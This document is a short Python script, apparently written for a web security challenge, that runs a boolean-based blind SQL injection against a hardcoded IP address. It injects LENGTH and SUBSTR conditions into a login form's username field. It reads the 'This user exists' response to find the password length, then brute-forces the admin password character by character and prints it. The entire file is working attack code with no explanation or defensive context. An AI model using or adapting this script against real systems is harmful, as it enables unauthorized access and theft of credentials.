ENDPOINT = "http://52.183.128.218/"
import requests, re, string

def check_length(l):
	query = 'admin" AND LENGTH(password) =  {0} --"'.format(l)
	resp  = requests.post(ENDPOINT, data = {"username":query})
	data  = resp.text

	first = data.find('<div id="content">')
	second = data.find('<div id="viewsource">')

	success = "This user exists.<br>"
	matched = data[first+18:second]
	
	if(matched.strip() == success):
		return True
	return False

def check_character(ch, position):
	query = 'admin" AND SUBSTR(password, {1}, 1) = "{0}'.format(ch, position)
	resp  = requests.post(ENDPOINT, data = {"username":query})
	data  = resp.text

	first = data.find('<div id="content">')
	second = data.find('<div id="viewsource">')

	success = "This user exists.<br>"
	matched = data[first+18:second]
	
	# print (matched.strip())
	if(matched.strip() == success):
		return True
	return False

length = -1
print ("Trying all length values in range to get value of the length of password")
for _ in range(65):
	status = (check_length(_))
	if status:
		print ("Success at length {0}, password length is {0}".format(_))
		length = _
		break
	
print ("Now bruteforcing over all character positions")
total = list(string.printable)

final = ""
for _ in range(length):
	print ("At Character index {0}".format(_ + 1))
	got = False
	for ch in total:
		status = check_character(ch, _ + 1)
		if status:
			print ("Got success at {0}, character at index {1} is {0}".format(ch, _+1))
			final += ch
			got = True
			break
	if not got:
		print ("Fatal Error no character matched")
		break

print ("admin password is {0}".format(final))